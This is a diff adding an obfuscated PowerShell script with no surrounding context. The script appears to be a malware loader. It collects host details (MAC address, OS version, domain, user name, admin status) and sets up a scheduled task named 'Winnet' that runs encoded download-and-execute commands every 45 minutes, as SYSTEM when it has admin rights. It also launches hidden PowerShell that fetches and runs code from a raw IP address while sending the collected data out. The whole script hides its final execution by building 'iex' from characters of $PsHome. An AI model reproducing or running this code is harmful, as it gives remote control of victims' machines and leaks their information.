@@ -1,0 +1,40 @@
+(('
+    [string]$mac = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC)
+    try{	
+    $name = 'Global\PSEXEC'	
+    $exeflag = $flase	
+    New-Object System.Threading.Mutex ($true,$name,[ref]$exeflag)}catch{}
+    $dt = Get-Date -Format 'yyMMdd'
+    $path = "$env:temp\\ccc.log"
+    [string]$flag = test-path $path
+    $permit =  ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
+    $key = "mac="+$mac+"&av="+$av+"&version="+(Get-WmiObject -Class Win32_OperatingSystem).version+"&bit="+(Get-WmiObject Win32_OperatingSystem).OSArchitecture + "&flag2=" + $flag + "&domain=" + (Get-WmiObject win32_computersystem).Domain + "&user=" + $env:USERNAME + "&PS=" + $exeflagif($flag -eq 'False'){	
+     New-Item $path -type file	if($permit){		
+         try{		
+            $Text = "IEX (New-Object Net.WebClient).downloadstring('http://cdn.chatcdn.net/p?hig" + $dt + "')"		
+            $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)		
+            $bcode = [Convert]::ToBase64String($Bytes)		
+            $scexec = "/create /ru system /sc MINUTE /mo 45 /tn Winnet /tr " + '"' + "powershell -ep bypass -e $bcode" + '" /F'		
+            Start-Process -FilePath schtasks.exe -ArgumentList "$scexec"		
+        }catch{}	
+    }else{		
+        try{		
+            $Text = "IEX (New-Object Net.WebClient).downloadstring('http://cdn.chatcdn.net/p?low" + $dt + "')"		
+            $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)		
+            $bcode = [Convert]::ToBase64String($Bytes)		
+            $scexec = "/create /sc MINUTE /mo 45 /tn Winnet /tr " + '"' + "powershell -ep bypass -e $bcode" + '" /F'		
+            Start-Process -FilePath schtasks.exe -ArgumentList "$scexec"		
+        }catch{}	
+    }	
+    &schtasks /run /tn "Winnet"
+    }else{
+
+    }sleep (get-random -inputobject (1..30))
+    try{	
+        $run = Get-WmiObject Win32_Process | select commandline | Select-String -Pattern "update.png"	
+    if($run.length -eq 0){	
+        $onps = "/c powershell -nop -w hidden -ep bypass -c " + '"' + "IEX (New-Object Net.WebClient).downloadstring('http://188.166.162.201/update.png?v& + $key')" + '"'	
+        Start-Process -FilePath cmd.exe -ArgumentList "$onps"	
+    }else{}}
+    catch{}
+    sleep (get-random -inputobject (1..20))kill $pid') | & ( $PsHOme[4]+$PShoMe[30]+'x')
